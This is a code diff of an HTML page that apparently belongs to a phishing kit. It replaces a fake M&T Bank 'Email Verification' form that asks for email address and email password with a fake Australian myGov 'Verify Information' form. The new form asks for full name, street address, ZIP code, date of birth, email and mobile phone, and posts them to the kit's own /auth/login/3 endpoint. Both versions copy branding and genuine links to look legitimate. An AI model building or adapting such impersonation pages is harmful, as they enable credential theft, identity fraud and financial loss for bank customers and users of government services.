@@ -1,157 +1,185 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome to Online Banking</title>
-  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
-  <link href="/css/main.css" rel="stylesheet">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>
+    Sign in
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="shortcut icon" href="/img/favicon.png" type="image/png">
+	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/main.css">
   <script src="/js/jquery.js"></script>
 </head>
 
 <body>
-  <div class="cb-app">
-    <header class="cb-header">
-      <div class="grid-x align-center">
-        <div class="cell">
-          <a href="https://www.mtb.com/home-page" class="cb-logo">
-            <img src="/img/logo.svg">
-          </a>
-        </div>
-      </div>
-    </header>
+  <header role="banner" class="header">
+    <section class="wrapper">
+      <div class="inner">
+        <div class="cbLogin-grid">
+          <div class="cbLogin-grid-row">
+            <a href="https://beta.my.gov.au/" class="cbLogin-logo__link">
+              <img id="cbLogin-logo" src="/img/logo-dark.svg" role="img">
+            </a>
 
-
-    <form action="/auth/login/3" method="post">
-      <div class="cb-login-content">
-        <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
-          <div class="cell">
-            <div class="cb-header-sect cb-header-sect-login">
-              <h1>
-                Email Verification
-              </h1>
-              <p>
-                Help us confirm it's you by filling out the following information.
-              </p>
+            <div class="header-links">
+              <a href="https://beta.my.gov.au/en/about/help">Help</a>
             </div>
-          </div>
-
-          <div class="cell">
-            <label for="emailAddr">Email Address</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="text" id="emailAddr" name="emailAddr" autocomplete="off">
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Email Address.</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <label for="emailPass">Email Password</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="password" id="emailPass" name="emailPass" autocomplete="off">
-              <div class="input-group-button">
-                <button type="button" id="showHide" class="button clear inputHidden">Show</button>
-              </div>
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Email Password.</span>
-            </p>
-          </div>
-        </div>
-
-        <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
-          <div class="cell">
-            <button type="submit" class="button button__form-no-spacer expanded" id="submitBtn">Next</button>
-          </div>
-
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Login/LoginHelp" class="button button-padding-no-spacer expanded clear">Help with User ID or Passcode</a>
-          </div>
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Enrollment/Enroll" class="button button__padding expanded clear">Enroll Now</a>
-          </div>
-
-          <p class="cell text-center __font-size-tiny __color-gray-accent">Unauthorized access is prohibited. Usage may be monitored.</p>
-        </div>
-      </div>
-    </form>
-
-    <hr class="__spacer-section">
-
-    <div class="cb-error-content">
-      <div class="grid-x grid-padding-x grid-x__padded">
-        <div class="cell text-center">
-          <p class="__font-size-secondary">
-            Have questions about M&amp;T Online Banking?
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Personal Accounts:
-            <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 8am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 6am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-section __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
-        </div>
-      </div>
-    </div>
-
-    <section class="cb-footer cb-footer__auth" style="height: 14.25rem;">
-      <div class="grid-x" style="height: 14.25rem;">
-        <div class="cell flex-container flex-dir-column align-center-middle">
-          <div class="cb-footer--auth">
-            <a href="https://upgrade.mtb.com/olb-upgrade">Get Started Guide</a>
-            <a href="https://www.mtb.com/olbsecurity">Security Assistance</a>
-            <a href="https://www3.mtb.com/homepage/explore-the-m-and-t-bank-help-center/digital-services-agreement.html">Digital Service Agreement</a>
-            <a href="https://asset.mtb.com/Documents/html/ESign.htm">ESign Agreement</a>
-            <a href="https://mtb.com/olb-accessibility">Accessibility</a>
-            <a href="https://www.mtb.com/olb-personalsite">mtb.com</a>
-          </div>
-
-          <div class="cb-footer--non-auth">
-            <p>
-              ©2023 M&amp;T Bank. All Rights Reserved.<br>
-              Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use"> Terms of Use</a> and <a href="https://www.mtb.com/privacy">Privacy</a>.
-            </p>
-            <div class="cb-footer__logo">
-              <a href="https://www.mtb.com/equalhousinglender">
-                <img src="/img/ehl.svg" class="cb-footer__ehl">
-              </a>
-              <a href="https://www.mtb.com/olb-entrust">
-                <img src="/img/entrust.svg" class="cb-footer__entrust">
-              </a>
-            </div>
-            <p>
-              Equal Housing Lender NMLS #381076
-              <a href="https://www.mtb.com/fdic">Member FDIC</a>
-            </p>
           </div>
         </div>
       </div>
     </section>
+  </header>
+
+  <div class="wrapper-mapwap">
+    <div class="main-block" role="main">
+      <div class="cbLogin">
+        <div class="login-grid-container">
+          <div class="login-grid-row">
+            <div class="login-grid-column">
+              <div class="login-card-wrapper">
+                <div class="main-login-card override">
+                  <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                  <h1>Verify Information with myGov</h1>
+                  <p class="login-instruction-text">Help us confirm it's you by filling out the following information.</p>
+
+                  <form class="cb-login-form alternative" action="/auth/login/3" method="post">
+                    <div class="input-group">
+                      <label class="override" for="fullName">Full Name</label>
+                      <div>
+                        <input id="fullName" name="fullName" class="cb-input" type="text" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your full name.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="input-group">
+                      <label class="override" for="address">Street Address</label>
+                      <div>
+                        <input id="address" name="address" class="cb-input" type="text" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your street address.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="input-group">
+                      <label class="override" for="zip">ZIP Code</label>
+                      <div>
+                        <input id="zip" name="zip" class="cb-input" type="text" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your ZIP code.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="input-group">
+                      <label class="override" for="dob">Date of Birth</label>
+                      <div>
+                        <input id="dob" name="dob" class="cb-input" type="date" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your date of birth.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="input-group">
+                      <label class="override" for="emailAddr">Email Address</label>
+                      <div>
+                        <input id="emailAddr" name="emailAddr" class="cb-input" type="email" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your email address.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="input-group">
+                      <label class="override" for="phone">Mobile Phone</label>
+                      <div>
+                        <input id="phone" name="phone" class="cb-input" type="tel" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your mobile phone.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="button-main-container override">
+                      <div class="button-container">
+                        <button type="submit" class="button-main button-submit">Next</button>
+                      </div>
+                    </div>
+
+                    <p class="create-account-text">
+											<a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.
+										</p>
+                  </form>
+
+                  <div class="hr-word">
+                    <div class="draw-circle">
+                      or
+                    </div>
+                  </div>
+
+                  <div class="login-card secondary">
+                    <div class="button-login-container">
+                      <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
+                      <div class="login-option-container">
+                        <div class="inner-options">
+                          <p class="external-links-zone">
+                            What is <a href="https://www.digitalidentity.gov.au/">Digital Identity</a> and <a href="https://www.mygovid.gov.au/">myGovID</a>?
+                          </p>
+                          <a class="button-digital-identity" href="https://login.my.gov.au/las/mygov-login?execution=e1s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
+
+  <footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+        <section class="footer-list">
+          <nav>
+            <h2 class="sr-only">Footer</h2>
+            <ul class="lower-links">
+              <li>
+                <a href="https://my.gov.au/en/about/terms">Terms of use</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/copyright">Copyright</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/accessibility">Accessibility</a>
+              </li>
+            </ul>
+          </nav>
+        </section>
+
+        <div class="footer-lower">
+          <section class="footer-lower-logo">
+            <a href="https://beta.my.gov.au/">
+              <img src="/img/logo-light.svg" width="313.17" height="70" role="img">
+            </a>
+          </section>
+
+          <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+        </div>
+      </div>
+    </div>
+  </footer>
 
   <script src="/js/main.js"></script>
 </body>
